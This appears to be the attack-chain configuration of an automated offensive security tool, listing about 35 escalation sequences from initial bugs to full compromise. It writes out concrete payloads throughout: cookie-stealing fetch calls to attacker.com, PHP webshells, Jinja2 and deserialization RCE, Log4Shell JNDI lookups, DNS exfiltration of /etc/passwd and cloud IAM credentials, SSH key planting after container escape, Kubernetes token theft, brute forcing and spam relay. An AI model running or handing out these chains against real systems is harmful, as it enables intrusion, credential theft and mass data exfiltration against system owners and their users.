_comment: Attack Chains: Multi-stage exploitation paths. Each chain links findings into actionable escalation sequences. Edit here — never hardcode in Python. Fields: id (unique), name, description, triggers (keywords), steps (ordered actions with tool_hint and success_criteria), required_findings (must be confirmed), severity, estimated_time, detection_risk, prerequisites, post_exploitation.

chains.name: SSRF to Cloud Metadata Exfiltration
chains.description: Escalate SSRF to cloud metadata exfiltration and IAM credential theft for full cloud account compromise

steps.description: Confirm SSRF with callback to attacker-controlled server (interactsh/collaborator)
steps.success_criteria: DNS/HTTP callback received with target IP

steps.description: Access AWS IMDSv1 metadata at 169.254.169.254/latest/meta-data/
Steal IAM credentials from security-credentials/ endpoint
Enumerate S3 buckets via aws s3 ls with stolen credentials
Dump sensitive data from S3 (backups, configs, logs)

prerequisites: IMDSv1 enabled or SSRF with redirect

chains.name: SQL Injection to OS Command Execution
chains.description: Escalate SQLi to full RCE via INTO OUTFILE webshell or xp_cmdshell

steps.description: Confirm SQL injection with UNION-based or error-based technique
Enumerate database schema: tables, columns, users
Check write access: SELECT @@secure_file_priv
Write PHP webshell via INTO OUTFILE
Execute OS commands via webshell

chains.name: XSS to Session Hijacking and Account Takeover
chains.description: Escalate XSS to cookie theft, session hijacking, and full account takeover

steps.description: Confirm XSS with basic alert(1) payload
Check for HttpOnly flag on session cookies
Craft cookie stealer: fetch('https://attacker.com/?c='+document.cookie)
Inject stored XSS in high-traffic page (profile, comment, dashboard)
steps.success_criteria: XSS triggers on page load for other users

steps.description: Hijack victim session by injecting stolen cookie

chains.name: IDOR to Admin Account Takeover
chains.description: Exploit IDOR to enumerate users, find admin, and take over admin account

steps.description: Confirm horizontal IDOR: change your user_id to adjacent ID
Enumerate user IDs sequentially (1, 2, 3... 1000)
Access admin profile via IDOR: /api/user/{admin_id}
Trigger password reset for admin account
Intercept reset email via stored XSS or email injection
Reset admin password and login

prerequisites: No rate limiting on password reset

chains.name: Unrestricted File Upload to RCE
chains.description: Bypass file upload restrictions to plant webshell and achieve RCE

steps.description: Test extension filter: upload shell.php, shell.php5, shell.phtml
Bypass MIME check: send PHP content with Content-Type: image/jpeg
Bypass magic byte: GIF89a; <?php system($_GET['c']); ?>
Double extension bypass: shell.php.jpg, shell.png.php
Access webshell: /uploads/shell.php?c=id

chains.name: LFI to RCE via Log Poisoning
chains.description: Escalate LFI to RCE by poisoning Apache/Nginx logs with PHP payload in User-Agent

steps.description: Confirm LFI: ../../../../etc/passwd returns root:x:0:0
Poison Apache access.log: User-Agent: <?php system($_GET['c']); ?>
Include poisoned log via LFI: ../../var/log/apache/access.log
Execute commands: ?c=id

chains.name: JWT Algorithm Confusion Attack
chains.description: Exploit RS256 to HS256 confusion or alg:none bypass to forge admin JWT

steps.description: Capture JWT from Authorization: Bearer header
Decode JWT and inspect header: check alg (RS256/HS256)
Test alg:none: change header to {"alg":"none"}, remove signature
Test RS256→HS256: sign with public key as HMAC secret
Forge admin claims: {"role":"admin","isAdmin":true}

chains.name: OAuth Redirect URI Bypass and Token Theft
chains.description: Bypass OAuth redirect_uri validation to steal authorization codes and access tokens

steps.description: Identify OAuth flow: /authorize?client_id=X&redirect_uri=Y
Test open redirect: redirect_uri=https://attacker.com
Bypass allowlist: https://target.com.attacker.com or https://target.com@attacker.com
Craft malicious OAuth URL and send to victim
Capture authorization code from Referer header
Exchange code for access token

chains.name: Docker Container Breakout to Host Compromise
chains.description: Escape privileged Docker container to compromise underlying host

steps.description: Confirm container access via RCE or exposed Docker socket
Check for privileged flag: cat /proc/1/status | grep Cap
Mount host filesystem: mkdir /host && mount /dev/sda1 /host
Add SSH key to host: echo attacker_key >> /host/root/.ssh/authorized_keys
SSH to host with planted key

chains.name: Kubernetes Pod Escape to Cluster Compromise
chains.description: Escape K8s pod via service account token theft and RBAC abuse

steps.description: Access pod: kubectl exec or RCE via app vulnerability
Steal service account token: cat /var/run/secrets/kubernetes.io/serviceaccount/token
Enumerate RBAC permissions: kubectl auth can-i --list
Create privileged pod or access secrets
Extract cluster secrets from etcd or Secrets API

chains.name: SSTI to Full RCE
chains.description: Escalate Server-Side Template Injection to OS command execution

steps.description: Confirm SSTI: {{7*7}} returns 49 in response
Identify template engine: probe Jinja2, Twig, Freemarker payloads
Escalate to RCE: Jinja2 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
Exfiltrate environment variables and secrets

chains.name: Prototype Pollution to RCE
chains.description: Exploit JavaScript prototype pollution to achieve RCE via gadget chain

steps.description: Confirm prototype pollution: POST {"__proto__":{"isAdmin":true}}
Identify merge library: lodash, deepmerge, jQuery extend
Pollute process.binding or spawnprototype for RCE
Execute OS command via prototype chain

chains.name: XXE to SSRF and File Read
chains.description: Exploit XXE to read internal files and perform SSRF to internal services

steps.description: Confirm XXE: inject <!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
Read sensitive files: /etc/passwd, /etc/shadow, ~/.ssh/id_rsa
SSRF via XXE: SYSTEM 'http://169.254.169.254/latest/meta-data/'
Internal port scan via XXE: http://192.168.1.1:22, :80, :443

chains.name: GraphQL IDOR to Mass Data Theft
chains.description: Exploit GraphQL IDOR via node() query to exfiltrate cross-user data at scale

steps.description: Enable introspection: query { __schema { types { name } } }
Identify node() or object query accepting ID parameter
Test IDOR: query { node(id: "gid://User/123") { ...on User { email role } } }
Batch enumerate all user IDs via script
Exfiltrate sensitive fields: emails, roles, API keys

chains.name: Insecure Deserialization to RCE
chains.description: Exploit unsafe deserialization to achieve RCE via gadget chains

steps.description: Identify deserialization: base64/rO0AB/PHPserialize in cookie/POST
Identify language/framework: Java (rO0AB), PHP (O:8:), Python (pickle)
Generate gadget payload: ysoserial CommonsCollections5 'nslookup attacker.com'
Upgrade to RCE: reverse shell payload

chains.name: Cache Poisoning to Stored XSS
chains.description: Poison web cache with XSS payload to affect all users visiting cached URL

steps.description: Identify unkeyed header: X-Forwarded-Host, X-Original-URL
steps.success_criteria: Header reflected but not in cache key

steps.description: Inject XSS via unkeyed header: X-Forwarded-Host: <script>alert(1)</script>
Poison cache: send request with unique cachebuster, verify stored
Mass impact: all users visiting cached URL trigger XSS

chains.name: HTTP Request Smuggling to Auth Bypass
chains.description: Smuggle HTTP request past WAF to access protected admin endpoints

steps.description: Probe for CL.TE: send Content-Length: 6 + Transfer-Encoding: chunked
steps.success_criteria: Request queued (X appears in next response)

steps.description: Smuggle prefix to admin endpoint: GET /admin HTTP/1.1
Bypass WAF: smuggle malicious request that frontend doesn't see
Access privileged functionality without authentication

chains.name: Path Traversal to Credential Theft and Lateral Movement
chains.description: Exploit path traversal to read credentials and pivot to internal services

steps.description: Confirm LFI: ../../../../etc/passwd returns root:x:0:0
Read application configs: .env, config.php, database.yml
Read SSH keys: ~/.ssh/id_rsa, /root/.ssh/authorized_keys
SSH to internal server with stolen key

chains.name: Second-Order SQL Injection via Stored Input
chains.description: Store SQLi payload in profile field, triggers when admin queries data

steps.description: Identify stored input: username, bio, comment, note field
Store SQLi payload: admin' UNION SELECT password FROM users--
Trigger execution: admin views profile/search results
Extract sensitive data via second-order injection

chains.name: Mass Assignment to Admin Takeover
chains.description: Exploit mass assignment to grant admin role without authorization

steps.description: Identify mass assignment: PUT /api/profile with extra fields
Add role=admin: {"role":"admin","isStaff":true}
Verify admin access: access /admin panel
Escalate privileges: create users, delete data, export DB

chains.name: API Key Leakage to Full Account Takeover
chains.description: Exploit leaked API key in JS/response to impersonate service account

steps.description: Find API key: grep JS files for api_key, secret, token
Test key: use in Authorization header for API call
Enumerate permissions: what endpoints accept this key?
Access all data: users, orders, payments via API

chains.name: Spring Boot Actuator to JMX RCE
chains.description: Exploit exposed Spring Boot Actuator to achieve RCE via JMX endpoint

steps.description: Enumerate actuator endpoints: GET /actuator, /actuator/jolokia
List MBeans: GET /actuator/jolokia/list
Execute via MBeanServer: createMBean with malicious class
Alternative: invoke Logback JNDI injection

chains.name: CORS Misconfiguration to Session Token Theft
chains.description: Exploit CORS with credentials to steal session tokens via cross-origin XHR

steps.description: Test CORS: send Origin: https://evil.com, check Access-Control-Allow-Origin
Craft malicious page: XHR to /api/user with credentials:include
Host phishing page, send to victim
Steal session token from response JSON

chains.name: Subdomain Takeover to Cookie Theft
chains.description: Claim dangling subdomain CNAME to steal parent domain cookies

steps.description: Find dangling CNAME: shop.target.com → shops.myshopify.com (404)
Register and claim subdomain on provider (Shopify, S3, GitHub)
Set cookie on *.target.com via malicious JS
Steal session when victim visits main domain

chains.name: SSRF to Redis RCE via Gopher
chains.description: Exploit SSRF with gopher:// to execute Redis commands and write webshell

steps.description: Confirm SSRF: callback to attacker DNS
Probe internal Redis: gopher://127.0.0.1:6379/_PING
Write webshell: gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html
Access webshell via HTTP

chains.name: Default Credentials to Internal Network Pivot
chains.description: Exploit default admin credentials to access management console and pivot to internal network

steps.description: Identify admin panel: /admin, /manager, /console
Test default creds: admin/admin, admin/password, tomcat/tomcat
Access management features: deploy, execute, config
Deploy malicious app or execute system command

chains.name: Open Redirect to OAuth Token Theft
chains.description: Exploit open redirect in OAuth flow to steal authorization codes

steps.description: Find open redirect: /redirect?url=https://attacker.com
Craft OAuth URL: /authorize?client_id=X&redirect_uri=https://target.com/redirect?url=https://attacker.com
Victim authorizes, redirected to attacker.com with code
Exchange code for access token

chains.name: SQLi to Password Hash Dump and Crack
chains.description: Dump password hashes via SQLi and crack offline with hashcat

steps.description: Confirm SQLi and extract database name
Dump users table: UNION SELECT email, password FROM users
Identify hash type: MD5, SHA256, bcrypt
Crack with hashcat: -m 0 (MD5), -m 100 (SHA1), -m 3200 (bcrypt)

chains.name: Log4Shell JNDI Injection to RCE
chains.description: Exploit Log4j JNDI injection to achieve RCE via LDAP/RMI callback

steps.description: Identify Java app with Log4j (User-Agent logging, error logs)
Inject JNDI: ${jndi:ldap://attacker.com/a}
Host malicious LDAP server returning Exploit.class
Execute payload: reverse shell or command

chains.name: Blind SSRF to OOB Data Exfiltration
chains.description: Exfiltrate internal data via blind SSRF using DNS subdomain encoding

steps.description: Confirm blind SSRF: DNS callback to interactsh
Exfil via DNS: http://$(whoami|base64).attacker.com
Read internal file: http://$(cat /etc/passwd|base64).attacker.com
Extract cloud metadata: http://$(curl 169.254.169.254/latest/meta-data/iam|base64).attacker.com

chains.name: GraphQL Batching to Credential Stuffing
chains.description: Abuse GraphQL batched mutations to bypass rate limiting for credential stuffing

steps.description: Identify login mutation: mutation { login(email:, password:) }
Craft batch request: [{"query":"mutation{login(e:'a',p:'x')}"}, ...] x1000
Analyze responses: different length/error for valid credentials
Login with valid credentials

chains.name: Account Enumeration to Targeted Brute Force
chains.description: Enumerate valid usernames via differential response, then brute force passwords

steps.description: Test registration: admin@target.com vs random@target.com
Enumerate via password reset: 'user exists' vs 'user not found'
Brute force with valid usernames: hydra -l admin -p rockyou.txt
Login with cracked credentials

chains.name: NoSQL Injection to Mass Data Theft
chains.description: Exploit NoSQL operator injection to bypass auth and exfiltrate database

steps.description: Confirm NoSQLi: {"username":{"$ne":null},"password":{"$ne":null}}
Enumerate collections: {"$where":"this.constructor.name=='Collection'"}
Dump users: {"$where":"return true"} with projection {email:1, password:1}
Blind extraction: {"password":{"$regex":"^a"}} — iterate chars

chains.name: LDAP Injection to Authentication Bypass
chains.description: Exploit LDAP filter injection to bypass auth and enumerate directory

steps.description: Confirm LDAPi: admin*)(uid=*))(|(uid=*
Enumerate users: admin*)(uid=*))(|(uid=*a*) — check response delta
Extract attributes: *(objectClass=*))(|(objectClass=*)
Dump full directory via automated script

chains.name: Race Condition to Double-Spend Attack
chains.description: Exploit race condition in financial endpoint for double-spend or coupon abuse

steps.description: Identify state-changing endpoint: /transfer, /redeem, /withdraw
Send 50 concurrent requests with same payload
Verify impact: balance negative, coupon used 50x
Document PoC: video + request logs

chains.name: Email Header Injection to Spam Relay
chains.description: Abuse contact form as spam relay via CC/BCC header injection

steps.description: Identify email functionality: contact, invite, feedback
Inject CC: name%0ACc:victim1@example.com,victim2@example.com
Forge sender: subject=Invoice%0AFrom:billing@target.com
Mass spam: automate injection for bulk sending
